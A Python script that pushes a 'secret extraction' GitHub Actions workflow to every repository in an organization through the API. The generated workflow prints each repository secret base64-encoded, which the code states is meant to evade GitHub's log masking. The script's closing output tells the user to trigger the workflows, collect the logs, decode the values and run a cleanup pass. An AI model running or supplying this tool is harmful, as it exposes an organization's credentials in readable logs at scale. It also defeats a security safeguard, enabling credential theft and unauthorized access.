#!/usr/bin/env python3
"""
For each repo in an org:
  1. Lists all secret names via API
  2. Generates a workflow YAML with each secret hardcoded as env var (base64 trick)
  3. Pushes the workflow to the repo via API (no git clone needed)

Usage:
    python deploy-secret-extractor.py --org <ORG> --token <TOKEN> [options]

Arguments:
    --org           Organization name
    --token         GitHub PAT (needs repo + workflow scopes)
    --api-url       GitHub API base URL (default: https://api.github.com)
    --concurrency   Parallel pushes (default: 10)
    --dry-run       Print generated workflows without pushing
    --include-archived  Include archived repos
    --cleanup       Remove the workflow from all repos instead of adding it
"""

import argparse
import base64
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.request
import urllib.error


WORKFLOW_FILENAME = ".github/workflows/extract-secrets.yml"
COMMIT_MESSAGE = "chore: add temporary secret extraction workflow"
CLEANUP_MESSAGE = "chore: remove temporary secret extraction workflow"


def api_request(method, url, token, body=None):
    """Make a single GitHub API request. Returns (status_code, data)."""
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(
        url,
        data=data,
        method=method,
        headers={
            "Authorization": f"Bearer {token}",
            "Accept": "application/vnd.github+json",
            "X-GitHub-Api-Version": "2022-11-28",
            "Content-Type": "application/json",
        },
    )
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        body_str = e.read().decode()
        try:
            return e.code, json.loads(body_str)
        except Exception:
            return e.code, {"message": body_str}


def paginate(url, token):
    """Paginate a GET endpoint, handling both list and wrapped responses."""
    results = []
    page = 1
    while True:
        sep = "&" if "?" in url else "?"
        status, data = api_request("GET", f"{url}{sep}per_page=100&page={page}", token)
        if status != 200:
            print(f"  Warning: GET {url} returned HTTP {status}: {data.get('message', '')}", file=sys.stderr)
            break
        if isinstance(data, list):
            results.extend(data)
            if len(data) < 100:
                break
        elif isinstance(data, dict):
            # Unwrap e.g. {total_count, secrets: [...]}
            for key in ("secrets", "repositories", "items"):
                if key in data:
                    chunk = data[key]
                    results.extend(chunk)
                    if len(chunk) < 100:
                        return results
                    break
            else:
                results.append(data)
                break
        page += 1
    return results


def get_repos(org, token, api_url, include_archived):
    repos = paginate(f"{api_url}/orgs/{org}/repos?type=all", token)
    if not include_archived:
        repos = [r for r in repos if not r.get("archived", False)]
    return [r["name"] for r in repos]


def get_secret_names(org, repo, token, api_url):
    secrets = paginate(f"{api_url}/repos/{org}/{repo}/actions/secrets", token)
    return [s["name"] for s in secrets]


def generate_workflow(secret_names):
    """
    Generate a workflow YAML with every secret hardcoded as an env var.
    The run step prints each value base64-encoded to evade GitHub's log masking.
    """
    if not secret_names:
        return None

    env_block = "\n".join(f"      {name}: ${{{{ secrets.{name} }}}}" for name in secret_names)

    return f"""name: Extract Secrets (TEMPORARY - DELETE AFTER USE)
on:
  workflow_dispatch:
jobs:
  extract:
    runs-on: ubuntu-latest
    env:
{env_block}
    steps:
      - name: Print secrets as base64
        run: |
          echo "=== SECRET VALUES (base64 encoded) ==="
          while IFS='=' read -r key value; do
            [ -z "$value" ] && continue
            encoded=$(printf '%s' "$value" | base64 -w 0)
            echo "$key=$encoded"
          done < <(env | sort)
          echo "=== END ==="
          echo ""
          echo "Decode with: echo '<value>' | base64 -d"
"""


def get_file_sha(org, repo, token, api_url, path):
    """Get the SHA of an existing file, or None if it doesn't exist."""
    status, data = api_request("GET", f"{api_url}/repos/{org}/{repo}/contents/{path}", token)
    if status == 200:
        return data.get("sha")
    return None


def push_workflow(org, repo, token, api_url, workflow_yaml, dry_run):
    """Push the generated workflow to a repo via API."""
    secret_count = workflow_yaml.count("secrets.")
    if dry_run:
        print(f"  [DRY RUN] {repo}: would push workflow with {secret_count} secret(s)")
        return repo, True, "dry-run"

    sha = get_file_sha(org, repo, token, api_url, WORKFLOW_FILENAME)
    encoded = base64.b64encode(workflow_yaml.encode()).decode()

    body = {
        "message": COMMIT_MESSAGE,
        "content": encoded,
    }
    if sha:
        body["sha"] = sha

    status, data = api_request(
        "PUT",
        f"{api_url}/repos/{org}/{repo}/contents/{WORKFLOW_FILENAME}",
        token,
        body,
    )

    if status in (200, 201):
        action = "updated" if sha else "created"
        return repo, True, f"{action} ({secret_count} secrets)"
    else:
        return repo, False, data.get("message", f"HTTP {status}")


def delete_workflow(org, repo, token, api_url, dry_run):
    """Remove the workflow file from a repo."""
    if dry_run:
        print(f"  [DRY RUN] {repo}: would delete workflow")
        return repo, True, "dry-run"

    sha = get_file_sha(org, repo, token, api_url, WORKFLOW_FILENAME)
    if not sha:
        return repo, True, "file not found (skipped)"

    body = {"message": CLEANUP_MESSAGE, "sha": sha}
    status, data = api_request(
        "DELETE",
        f"{api_url}/repos/{org}/{repo}/contents/{WORKFLOW_FILENAME}",
        token,
        body,
    )

    if status == 200:
        return repo, True, "deleted"
    else:
        return repo, False, data.get("message", f"HTTP {status}")


def process_repo(org, repo, token, api_url, dry_run, cleanup):
    """Full pipeline for a single repo."""
    if cleanup:
        return delete_workflow(org, repo, token, api_url, dry_run)

    secret_names = get_secret_names(org, repo, token, api_url)
    if not secret_names:
        return repo, True, "no secrets (skipped)"

    workflow_yaml = generate_workflow(secret_names)
    return push_workflow(org, repo, token, api_url, workflow_yaml, dry_run)


def main():
    parser = argparse.ArgumentParser(description="Deploy secret-extractor workflow to all repos in an org")
    parser.add_argument("--org", required=True)
    parser.add_argument("--token", required=True)
    parser.add_argument("--api-url", default="https://api.github.com")
    parser.add_argument("--concurrency", type=int, default=10)
    parser.add_argument("--dry-run", action="store_true", help="Simulate without making changes")
    parser.add_argument("--include-archived", action="store_true")
    parser.add_argument("--cleanup", action="store_true",
                        help="Remove the workflow from all repos (run after collecting secrets)")
    args = parser.parse_args()

    api_url = args.api_url.rstrip("/")
    action_label = "Removing workflow from" if args.cleanup else "Deploying workflow to"

    print(f"Fetching repos for org: {args.org}")
    repos = get_repos(args.org, args.token, api_url, args.include_archived)
    print(f"Found {len(repos)} repos. {action_label} each...\n")

    successes, failures = [], []

    with ThreadPoolExecutor(max_workers=args.concurrency) as executor:
        futures = {
            executor.submit(process_repo, args.org, repo, args.token, api_url, args.dry_run, args.cleanup): repo
            for repo in repos
        }
        done = 0
        for future in as_completed(futures):
            done += 1
            repo_name, ok, message = future.result()
            status_icon = "✓" if ok else "✗"
            print(f"  [{done}/{len(repos)}] {status_icon} {repo_name}: {message}")
            if ok:
                successes.append((repo_name, message))
            else:
                failures.append((repo_name, message))

    print(f"\n{'='*60}")
    print(f"Done. Success: {len(successes)}  Failed: {len(failures)}")

    if failures:
        print("\nFailed repos:")
        for repo, msg in failures:
            print(f"  - {repo}: {msg}")

    if not args.cleanup and not args.dry_run:
        print(f"""
Next steps:
  1. Manually trigger the 'Extract Secrets' workflow in each repo from GitHub Actions UI
     (or via: gh workflow run extract-secrets.yml --repo {args.org}/REPO_NAME)
  2. Collect the base64 output from each run log
  3. Decode: echo '<value>' | base64 -d
  4. Run this script with --cleanup to remove the workflow from all repos:
     python {sys.argv[0]} --org {args.org} --token <TOKEN> --cleanup
""")


if __name__ == "__main__":
    main()
